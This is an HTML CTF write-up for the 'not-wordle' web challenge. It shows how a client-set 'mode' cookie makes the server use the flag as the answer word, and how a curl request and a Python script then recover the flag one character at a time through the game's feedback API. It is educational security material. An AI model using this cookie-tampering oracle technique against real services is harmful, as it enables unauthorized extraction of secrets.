@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - not-wordle Challenge</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .step {
+            margin-bottom: 30px;
+        }
+
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+
+        ul {
+            padding-left: 20px;
+        }
+
+        ul li {
+            margin-bottom: 8px;
+        }
+
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+
+        .math {
+            background-color: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .wordle-box {
+            display: inline-block;
+            padding: 5px 10px;
+            margin: 3px;
+            border-radius: 3px;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .wordle-correct {
+            background-color: #538d4e;
+            color: white;
+        }
+
+        .wordle-present {
+            background-color: #b59f3b;
+            color: white;
+        }
+
+        .wordle-absent {
+            background-color: #3a3a3c;
+            color: white;
+        }
+
+        /* Custom Scrollbar */
+        *::-webkit-scrollbar {
+            width: 12px;
+            height: 12px;
+        }
+
+        *::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 10px;
+            border: 1px solid #2a2a2a;
+        }
+
+        *::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #0d7377 0%, #14ffec 100%);
+            border-radius: 10px;
+            border: 2px solid #1a1a1a;
+        }
+
+        *::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #14ffec 0%, #0d7377 100%);
+            box-shadow: 0 0 8px rgba(20, 255, 236, 0.6);
+        }
+
+        *::-webkit-scrollbar-corner {
+            background: #1a1a1a;
+        }
+
+        /* Firefox */
+        * {
+            scrollbar-width: thin;
+            scrollbar-color: #0d7377 #1a1a1a;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>🔤 Challenge: not-wordle</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC Finals</div>
+            <div>🌐 Category: Web</div>
+            <div>💯 Points: 100</div>
+            <div>📊 Solves: 15</div>
+            <div>👤 Author: Unknown</div>
+            <div>👤 Solver: IRVANNI/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>📝 Challenge Description</h2>
+        <div class="description">
+            <p>Definitely not wordle...</p>
+        </div>
+
+        <p><strong>🌐 Webpage:</strong> <a href="http://9f53d83e.ctf.ac.upt.ro" target="_blank">http://9f53d83e.ctf.ac.upt.ro</a></p>
+        <p><strong>📦 Files:</strong> handout.zip</p>
+    </div>
+
+    <div class="container">
+        <h2>🔎 Initial Reconnaissance</h2>
+        <p>The challenge presents a web application that mimics the popular word-guessing game Wordle. Upon visiting the webpage, I was greeted with a familiar interface showing a grid where players guess five-letter words.</p>
+
+        <div class="key-point">
+            <p>🎯 <strong>Wordle Mechanics Reminder:</strong></p>
+            <ul>
+                <li><span class="wordle-correct">Green (Correct)</span> - Letter is in the word and in the correct position</li>
+                <li><span class="wordle-present">Yellow (Present)</span> - Letter is in the word but in wrong position</li>
+                <li><span class="wordle-absent">Gray (Absent)</span> - Letter is not in the word at all</li>
+            </ul>
+        </div>
+
+        <p>However, this was "definitely not wordle" - there had to be something different. I downloaded and analyzed the handout.zip file to understand the application's internals.</p>
+    </div>
+
+    <div class="container">
+        <h2>🛠️ Analysis and Solution</h2>
+
+        <div class="step">
+            <h3>📂 Step 1: Source Code Analysis</h3>
+            <p>After extracting the handout.zip, I examined the application's source code to understand how it worked. The key findings were:</p>
+
+            <div class="highlight-section">
+                <p>🔍 <strong>Critical Discovery - Cookie Management:</strong></p>
+                <p>The application uses two important cookies:</p>
+                <ul>
+                    <li><code>mode</code> - Determines the game mode</li>
+                    <li><code>randomSecret</code> - Controls which word to guess</li>
+                </ul>
+            </div>
+
+            <p>Looking at the code, I noticed a special mode called <code>wotd</code> (Word of the Day). When the <code>mode</code> cookie is set to <code>wotd</code>, something interesting happens:</p>
+
+            <pre><code class="language-javascript">// Pseudo-code from source analysis
+function getSecret(mode, cookies) {
+    const m = (mode || cookies.mode || 'random').toLowerCase();
+    if (m === 'wotd') {
+        const flag = (process.env.FLAG || 'REAL_FLAG_ON_REMOTE').toLowerCase();
+        return { mode: 'wotd', secret: flag };
+    }
+    let secret = cookies.randomSecret;
+    if (!secret || !/^[a-z]{5}$/.test(secret)) {
+        secret = pickRandomWord();
+    }
+    return { mode: 'random', secret };
+}</code></pre>
+
+            <div class="key-point">
+                <p>💡 <strong>The Vulnerability:</strong> By setting the <code>mode</code> cookie to <code>wotd</code>, we can make the application use the flag as the secret word! Then we just need to "guess" it.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>🔍 Step 2: API Endpoint Discovery</h3>
+            <p>Next, I investigated the API endpoints. The application exposes a <code>/api/check</code> endpoint that accepts guesses and returns feedback:</p>
+
+            <div class="command">
+                curl -X POST http://9f53d83e.ctf.ac.upt.ro/api/check \<br>
+                &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
+                &nbsp;&nbsp;-b "mode=wotd; randomSecret=wotd" \<br>
+                &nbsp;&nbsp;-d '{"guess": "CTF{a"}'
+            </div>
+
+            <div class="output">
+{<br>
+&nbsp;&nbsp;"correct": false,<br>
+&nbsp;&nbsp;"feedback": [<br>
+&nbsp;&nbsp;&nbsp;&nbsp;{"char": "C", "status": "correct"},<br>
+&nbsp;&nbsp;&nbsp;&nbsp;{"char": "T", "status": "correct"},<br>
+&nbsp;&nbsp;&nbsp;&nbsp;{"char": "F", "status": "correct"},<br>
+&nbsp;&nbsp;&nbsp;&nbsp;{"char": "{", "status": "correct"},<br>
+&nbsp;&nbsp;&nbsp;&nbsp;{"char": "a", "status": "absent"}<br>
+&nbsp;&nbsp;]<br>
+}
+            </div>
+
+            <p>The API returns detailed feedback for each character:</p>
+            <ul>
+                <li><strong>"correct"</strong> - Character is in the right position ✅</li>
+                <li><strong>"present"</strong> - Character exists but in wrong position ⚠️</li>
+                <li><strong>"absent"</strong> - Character doesn't exist in the secret ❌</li>
+            </ul>
+
+            <div class="highlight-section">
+                <p>🎯 <strong>Exploitation Strategy:</strong> We can leak the flag character by character! By testing each possible character at each position and checking for "correct" status, we can incrementally build the complete flag.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>⚙️ Step 3: Character-by-Character Extraction</h3>
+            <p>The attack works as follows:</p>
+
+            <ol>
+                <li>Start with the known prefix: <code>CTF{</code></li>
+                <li>For each unknown position, try all possible characters</li>
+                <li>Check the feedback for that position</li>
+                <li>If status is "correct", we found the right character!</li>
+                <li>Append it to our known prefix and continue</li>
+                <li>Stop when we encounter the closing brace <code>}</code></li>
+            </ol>
+
+            <div class="math">
+                Known: CTF{<br>
+                Try: CTF{0, CTF{1, CTF{2, ..., CTF{a, CTF{b, ...<br>
+                <br>
+                If feedback[4].status == "correct":<br>
+                &nbsp;&nbsp;Known += character<br>
+                <br>
+                Repeat until: Known.endswith("}")
+            </div>
+
+            <p>Since flags typically contain hexadecimal characters (0-9, a-f) plus the closing brace, we only need to test a small character set for each position.</p>
+        </div>
+
+        <div class="step">
+            <h3>💻 Step 4: Automated Exploitation Script</h3>
+            <p>I wrote a Python script to automate the character-by-character extraction:</p>
+
+            <pre><code class="language-python">import requests
+import string
+
+url = "http://9f53d83e.ctf.ac.upt.ro/"
+flag = "CTF{"
+
+# Continue until we find the closing brace
+while not flag.endswith("}"):
+    # Try all hexadecimal digits plus closing brace
+    for c in string.hexdigits + "}":
+        # Make request with current guess
+        r = requests.post(
+            url + "api/check",
+            json={'guess': flag + c},
+            cookies={'mode': 'wotd', 'randomSecret': 'wotd'}
+        )
+        
+        response = r.json()
+        
+        # Check if we found the complete flag
+        if response['correct']:
+            print(flag + c)
+            exit(0)
+        
+        # Check if current character is correct
+        current_position = len(flag)
+        if response['feedback'][current_position]['status'] == "correct":
+            flag += c
+            break
+    
+    # Print progress
+    print(flag)
+
+print("Final flag:", flag)</code></pre>
+
+            <h4>🧠 How the Script Works</h4>
+            <div class="key-point">
+                <p><strong>Cookie Manipulation:</strong> We set <code>mode=wotd</code> to force the server to use the flag as the secret word.</p>
+                
+                <p><strong>Character Testing:</strong> For each unknown position, we iterate through <code>string.hexdigits</code> (0-9, a-f, A-F) plus the closing brace.</p>
+                
+                <p><strong>Feedback Analysis:</strong> We examine <code>response['feedback'][current_position]['status']</code> to see if our guessed character is correct.</p>
+                
+                <p><strong>Progressive Building:</strong> Once we find a correct character, we append it to our known prefix and move to the next position.</p>
+                
+                <p><strong>Termination:</strong> The loop stops when the flag ends with <code>}</code> or when <code>response['correct']</code> is true.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>🚀 Step 5: Execution and Results</h3>
+            <p>Running the script, I observed it progressively extracting each character:</p>
+
+            <div class="output">
+CTF{3<br>
+CTF{39<br>
+CTF{394<br>
+CTF{3945<br>
+CTF{39459<br>
+CTF{394598<br>
+CTF{394598e<br>
+CTF{394598e1<br>
+CTF{394598e19<br>
+...<br>
+CTF{394598e191e14a86520b95668a437e43a5508c709ba500d02679f5fa4d04a61d}<br>
+Final flag: CTF{394598e191e14a86520b95668a437e43a5508c709ba500d02679f5fa4d04a61d}
+            </div>
+
+            <p>The script successfully extracted the complete flag character by character! 🎉</p>
+        </div>
+
+        <div class="step">
+            <h3>🏁 Step 6: Flag Capture</h3>
+            <div class="flag">
+                🚩 CTF{394598e191e14a86520b95668a437e43a5508c709ba500d02679f5fa4d04a61d}
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🎯 Key Takeaways</h2>
+        <ul>
+            <li>🍪 <strong>Cookie Manipulation:</strong> Cookies can control critical application behavior and should be validated server-side</li>
+            <li>🔍 <strong>Information Disclosure:</strong> Detailed feedback mechanisms can leak sensitive information</li>
+            <li>⚡ <strong>Oracle Attacks:</strong> APIs that provide yes/no feedback enable character-by-character extraction</li>
+            <li>🎮 <strong>Game Logic Flaws:</strong> Special modes or administrative features can be exploited if not properly secured</li>
+            <li>🤖 <strong>Automation:</strong> Repetitive extraction tasks are perfect candidates for scripting</li>
+            <li>📖 <strong>Source Code Analysis:</strong> Having access to the source code makes vulnerability discovery much easier</li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <h2>🔧 Technical Deep Dive</h2>
+        
+        <h3>Understanding Oracle Attacks</h3>
+        <p>This challenge demonstrates a classic <strong>oracle attack</strong> (also called a side-channel attack). An oracle is any mechanism that provides information about a secret through its behavior or responses.</p>
+        
+        <div class="math">
+            Oracle Query: "Is character X at position N?"<br>
+            Oracle Response: "correct" / "present" / "absent"<br>
+            <br>
+            By repeatedly querying the oracle, we can<br>
+            reconstruct the entire secret bit by bit.
+        </div>
+
+        <h3>Why This Vulnerability Exists</h3>
+        <p>The vulnerability stems from several design flaws:</p>
+        
+        <ol>
+            <li><strong>Client-Controlled State:</strong> The <code>mode</code> cookie is controlled by the client but affects critical server behavior</li>
+            <li><strong>Detailed Feedback:</strong> The API returns position-specific feedback, allowing precise extraction</li>
+            <li><strong>No Rate Limiting:</strong> Unlimited guesses enable exhaustive searching</li>
+            <li><strong>Special Admin Mode:</strong> The <code>wotd</code> mode uses the flag as the secret without proper authorization</li>
+        </ol>
+    </div>
+
+    <div class="container">
+        <h2>🎮 The Wordle Connection</h2>
+        <p>The challenge cleverly subverts the Wordle game mechanics:</p>
+        
+        <div class="highlight-section">
+            <p><strong>Legitimate Wordle:</strong> Players have 6 attempts to guess a 5-letter word. Feedback helps narrow down possibilities but doesn't leak the exact word character by character.</p>
+            
+            <p><strong>not-wordle Vulnerability:</strong> Unlimited attempts + character-specific feedback = complete secret extraction. The game mechanics become an exploitation primitive!</p>
+        </div>
+
+        <h3>Why "Definitely Not Wordle"?</h3>
+        <p>The challenge description is tongue-in-cheek:</p>
+        <ul>
+            <li>✅ It looks like Wordle</li>
+            <li>✅ It behaves like Wordle</li>
+            <li>❌ But it has critical security flaws</li>
+            <li>❌ The "word" is actually a 64-character flag</li>
+            <li>❌ You can manipulate it to reveal secrets</li>
+        </ul>
+
+        <p>It's "definitely not Wordle" because real Wordle doesn't have these vulnerabilities! 😄</p>
+    </div>
+
+    <div class="container">
+        <h2>📊 Performance Analysis</h2>
+        <p>Let's analyze the efficiency of our approach:</p>
+        
+        <div class="math">
+            Flag Length: 68 characters (including CTF{})<br>
+            Known Prefix: 4 characters (CTF{)<br>
+            Unknown: 64 characters<br>
+            <br>
+            Character Set: 16 hex digits (0-9, a-f) + 1 brace<br>
+            Worst Case per Position: 17 attempts<br>
+            Average Case per Position: ~8.5 attempts<br>
+            <br>
+            Total Requests: ~64 × 8.5 ≈ 544 requests<br>
+            Time (at 100ms/request): ~54 seconds
+        </div>
+
+        <p>This is extremely fast for extracting a 64-character secret! Traditional brute force would require 16^64 attempts, which is computationally impossible.</p>
+    </div>
+
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by IRVANNI/CuboConNoveQuadrati | Happy hacking! 🔓</p>
+    </div>
+</body>
+
+</html>
